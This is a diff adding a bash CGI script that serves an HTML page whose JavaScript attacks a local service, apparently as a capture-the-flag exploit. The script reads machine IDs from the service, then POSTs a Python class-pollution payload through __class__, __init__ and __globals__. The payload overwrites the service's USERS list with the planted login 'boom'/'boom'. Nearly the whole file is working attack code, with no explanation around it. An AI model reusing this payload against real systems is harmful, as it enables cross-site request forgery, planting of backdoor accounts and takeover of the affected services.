@@ -1,0 +1,45 @@
+#!/usr/bin/bash
+echo "Content-type: text/html"
+echo
+cat <<EOF
+<html>
+  <body>
+    <script>
+      console.log("JS loaded");
+
+      fetch("http://0.0.0.0:1337/get_tornados")
+        .then(response => {
+          console.log("get_tornados OK");
+          return response.json();
+        })
+        .then(machines => {
+          let firstMachine = machines[0].machine_id;
+          console.log("Machine ID:", firstMachine);
+
+          let json = {
+              "machine_id": firstMachine,
+              "status": "active",
+              "__class__": {
+                  "__init__": {
+                      "__globals__": {
+                          "USERS": [{"username": "boom", "password": "boom"}]
+                      }
+                  }
+              }
+          };
+
+          return fetch("http://0.0.0.0:1337/update_tornado", {
+              method: "POST",
+              body: JSON.stringify(json)
+          });
+        })
+        .then(() => {
+          console.log("update_tornado done");
+        })
+        .catch(err => {
+          console.log("ERROR!", err);
+        });
+    </script>
+  </body>
+</html>
+EOF
